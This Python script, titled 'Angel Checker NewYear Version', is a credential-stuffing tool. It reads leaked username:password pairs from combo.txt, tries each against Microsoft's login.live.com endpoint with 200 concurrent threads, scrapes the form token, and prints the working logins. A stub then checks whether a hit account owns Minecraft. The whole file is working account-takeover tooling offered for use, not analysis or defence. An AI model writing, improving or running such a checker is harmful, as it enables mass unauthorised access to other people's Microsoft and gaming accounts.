#encoding: utf-8
#auther: guapi
#create_date: 2024-02-06 19:00:23
import requests
from bs4 import BeautifulSoup
import logging
from colorama import Fore, init, Back
from retry import retry
from console.utils import set_title
from multiprocessing.dummy import Pool

APP_NAME = "Angel Checker NewYear Version"
logging.basicConfig(format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger()
init(autoreset=True)

class Account:
    def __init__(self, username: str, password: str) -> None:
        self.username = username
        self.password = password
        self._header =  {
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        }
        self._url = "https://login.live.com/ppsecure/post.srf"
        self._mc_url = "https://www.xbox.com/zh-cn/games/store/minecraft-java-bedrock-edition-for-pc/9nxp44l49shj"
        self.status = "Not logged in"
        self._hit_flage = False
        self._retrys = 0

    def print(self):
        out_text = f"[{self.status}] {self.username}:{self.password}"
        print_type =  Console.info if self.status == "Successful" else Console.error
        print_type(out_text)

    @retry(tries=3, delay=2, logger=None)
    def login(self):
        self.req = requests.session()
        html = self.req.get(self._url, headers=self._header).text
        post_url = html.split("urlPostMsa:'")[1].split("',CP:true")[0]
        PPFT = html.split("name=\"PPFT\"")[1].split('value="')[1].split("\"/>',C1:")[0]
        post_data = f"i13=0&login={self.username}&loginfmt={self.username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=122640"
        html = self.req.post(post_url,data=post_data, headers=self._header).text
        soup = BeautifulSoup(html, "html.parser")
        title = soup.find("title").text
        if title == "Microsoft 帐户":
            if self._retrys != 2:
                self._retrys += 1
                if title == "继续":
                    self.status = "Verification" 
                else:
                    self.status = "Wrong"
                    raise ValueError(title)
                return
            self.status = "Successful"
            self._hit_flage = True
        elif title == "继续":
            self.status = "Verification"
        else:
            self.status = "Wrong"
    
    def check_mc(self):
        "TODO 更新自动检查该账号有无MC"
        html = self.req.get(self._mc_url,headers=self._header).text
        print(html)

class Console:
    debug = lambda text: logging.debug(f"{Fore.LIGHTCYAN_EX}{text}{Fore.RESET}")
    info = lambda text: logging.info(f"{Fore.LIGHTGREEN_EX}{text}{Fore.RESET}")
    error = lambda text: logging.error(f"{Fore.LIGHTRED_EX}{text}{Fore.RESET}")
    warning = lambda text: logging.warning(f"{Fore.LIGHTYELLOW_EX}{text}{Fore.RESET}")
    critical = lambda text: logging.critical(f"{Fore.LIGHTMAGENTA_EX}{text}{Fore.RESET}")
    set_title = lambda text: set_title(f"{APP_NAME} {text}")

class App:
    def __init__(self):
        Console.set_title("Beta")
        Console.info("The initialization of the program is complete")
        self.hit = 0
        self.bad = 0
        self.all = 0
        self.left = lambda: self.all-(self.hit+self.bad)
        self.checker()

    def checker(self):
        pool = Pool(200)
        with open("combo.txt","r") as f:
            combo_list = f.read().split("\n")
            self.all = len(combo_list)

        for combo in combo_list:
            acc = Account(*combo.split(":"))
            pool.apply_async(self._task, args=(acc,))

        pool.close()
        pool.join()
        Console.info("You are welcome to use the program again after it has been run")

    def _task(self, acc: Account):
        acc.login()
        acc.print()
        if acc._hit_flage:
            self.hit += 1
        else:
            self.bad += 1
        Console.set_title(f"Hit: {self.hit} Bad:{self.bad} All/Left:{self.all}/{self.left()}")


if __name__ == "__main__":
    App()
    
    
